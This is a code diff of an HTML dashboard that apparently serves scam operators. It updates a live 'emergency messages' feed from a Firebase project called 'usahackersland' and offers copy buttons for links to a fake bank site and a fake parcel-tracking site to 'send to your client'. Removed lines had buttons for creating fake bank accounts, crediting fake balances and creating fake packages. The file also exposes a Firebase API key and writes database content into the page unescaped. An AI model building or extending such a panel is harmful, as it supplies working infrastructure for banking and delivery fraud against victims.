@@ -13,23 +13,51 @@
       padding: 20px;
     }
 
-    .emergency-box {
-      background: rgba(0, 0, 0, 0.9);
-      border: 1px solid red;
-      border-radius: 12px;
-      padding: 15px;
+    /* Emergency messages container */
+    #emergencyBox {
+      background: linear-gradient(135deg, #1e1e2f, #23234a);
+      border: 2px solid cyan;
+      border-radius: 14px;
+      padding: 20px;
       margin: 20px auto;
-      color: red;
       max-width: 1000px;
-      text-align: center;
-      font-size: 15px;
-    }
-    .emergency-box img {
-      max-width: 100%;
-      border-radius: 10px;
-      margin-top: 10px;
+      font-size: 16px;
+      color: white;
+      box-shadow: 0 0 20px rgba(0,255,255,0.5);
     }
 
+    .emergency-msg {
+      background: rgba(0,0,0,0.6);
+      border-left: 5px solid cyan;
+      padding: 15px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      text-align: left;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+
+    .emergency-msg p {
+      margin: 5px 0;
+      font-size: 15px;
+    }
+
+    .emergency-msg img {
+      max-width: 100%;
+      border-radius: 10px;
+      margin-top: 8px;
+    }
+
+    .emergency-msg a {
+      color: #00ffff;
+      text-decoration: underline;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Dashboard layout */
     .dashboard-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -52,11 +80,6 @@
       font-size: 20px;
     }
 
-    .dashboard-section p {
-      font-size: 14px;
-      margin-bottom: 4px;
-    }
-
     .link-box {
       background: #000;
       padding: 8px;
@@ -66,12 +89,6 @@
       font-size: 14px;
       word-break: break-all;
       color: lime;
-    }
-
-    .link-desc {
-      font-size: 13px;
-      color: #adff2f;
-      margin-bottom: 8px;
     }
 
     .btn {
@@ -96,53 +113,26 @@
 </head>
 <body>
 
-  <!-- Emergency Message -->
-  <div id="emergencyBox" class="emergency-box">
-    🚨 Loading emergency message...
+  <!-- Emergency Messages -->
+  <div id="emergencyBox">
+    🚨 Loading emergency messages...
   </div>
 
   <div class="dashboard-grid">
     <!-- 🏛️ Bank Section -->
     <div class="dashboard-section">
       <h2>🏛️ BANK</h2>
-
-      <!-- Copy Link -->
       <p>Copy this link and send to your client:</p>
       <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
-      <div class="link-desc">➡️ This is the link you send to clients for banking services.</div>
-      <button class="btn btn-copy" onclick="copyText('bankLink')">📋 Copy</button><br>
-
-      <!-- Open Account -->
-      <p>Open account here to register:</p>
-      <div class="link-desc">➡️ Click to open the registration page to start creating a client account.</div>
-      <button class="btn btn-lime" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://sp0m.com')">
-        Open Account
-      </button>
-
-      <!-- Credit Account -->
-      <p>Credit your bank account:</p>
-      <div class="link-desc">➡️ Click this to add credit to your account to simulate transactions.</div>
-      <button class="btn btn-green" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://bulksms4.github.io/BANKING/create-account.html')">
-        💵💰 Credited your bank account 🪙
-      </button>
+      <button class="btn btn-copy" onclick="copyText('bankLink')">📋 Copy</button>
     </div>
 
     <!-- ✈️🚢 Track Package Section -->
     <div class="dashboard-section">
-      <h2>✈️🚢 Track Package 🛍️🛒</h2>
-
-      <!-- Copy Link -->
+      <h2>✈️🚢 Track Package 🛍️</h2>
       <p>Copy this link and send to your client:</p>
       <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
-      <div class="link-desc">➡️ Give this link to your client to track the package you send.</div>
-      <button class="btn btn-copy" onclick="copyText('trackLink')">📋 Copy</button><br>
-
-      <!-- Open Tracking -->
-      <p>Open the account to create packages:</p>
-      <div class="link-desc">➡️ Open the account here to start creating the package for your client.</div>
-      <button class="btn btn-lime" style="font-size:16px; padding:12px 18px;" onclick="openInDashboard('https://bulksms4.github.io/x-cargo-exprees/')">
-        Open Tracking Account here👇
-      </button>
+      <button class="btn btn-copy" onclick="copyText('trackLink')">📋 Copy</button>
     </div>
   </div>
 
@@ -155,7 +145,7 @@
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
       authDomain: "usahackersland.firebaseapp.com",
       projectId: "usahackersland",
-      storageBucket: "usahackersland.firebasestorage.app",
+      storageBucket: "usahackersland.appspot.com",
       messagingSenderId: "588407428267",
       appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
       measurementId: "G-ZJ05T7YNSQ"
@@ -164,40 +154,38 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // -----------------------------
-    // Real-time Emergency Listener
-    // -----------------------------
     const emergencyBox = document.getElementById("emergencyBox");
-    db.collection("emergency").doc("current")
-      .onSnapshot((doc) => {
-        if (doc.exists) {
-          const data = doc.data();
-          let html = '';
-          if (data.text) html += `<p>${data.text}</p>`;
-          if (data.image) html += `<img src="${data.image}" alt="Emergency Image">`;
-          emergencyBox.innerHTML = html;
-        } else {
-          emergencyBox.innerText = "🚨 No emergency messages at the moment.";
+
+    // Listen to ALL emergency messages
+    db.collection("emergency")
+      .orderBy("timestamp", "desc")
+      .onSnapshot((snapshot) => {
+        if (snapshot.empty) {
+          emergencyBox.innerHTML = "🚨 No emergency messages.";
+          return;
         }
+
+        let html = "";
+        snapshot.forEach((doc) => {
+          const data = doc.data();
+          html += `
+            <div class="emergency-msg">
+              ${data.text ? `<p>${data.text}</p>` : ""}
+              ${data.image ? `<img src="${data.image}" alt="Emergency">` : ""}
+              ${data.link ? `<p>🔗 <a href="${data.link}" target="_blank">${data.link}</a></p>` : ""}
+              ${data.phone ? `<p>📞 ${data.phone}</p>` : ""}
+            </div>
+          `;
+        });
+        emergencyBox.innerHTML = html;
       });
 
-    // Copy link function
     function copyText(id) {
       const text = document.getElementById(id).innerText;
       navigator.clipboard.writeText(text).then(() => {
         alert("✅ Link copied: " + text);
       });
     }
-
-    // Open link inside parent dashboard iframe if exists
-    function openInDashboard(url) {
-      if (window.parent && window.parent.document.getElementById("dashboardFrame")) {
-        window.parent.document.getElementById("dashboardFrame").src = url;
-      } else {
-        window.location.href = url;
-      }
-    }
   </script>
-
 </body>
 </html>
